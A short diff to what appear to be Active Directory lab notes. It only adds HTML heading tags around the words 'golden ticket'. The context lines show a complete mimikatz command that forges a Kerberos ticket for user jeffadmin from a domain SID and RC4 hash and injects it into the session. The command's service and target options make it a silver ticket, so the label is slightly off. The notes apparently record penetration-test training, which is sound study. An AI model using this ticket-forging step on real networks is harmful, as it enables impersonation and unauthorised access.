@@ -103,7 +103,7 @@ this will give us the SID we need
 
     mimikatz# kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin
 
-this will create a golden ticket for the user jeffadmin
+this will create a <h3>golden ticket</h3> for the user jeffadmin
 
 we confirm our ticket is created and available
 
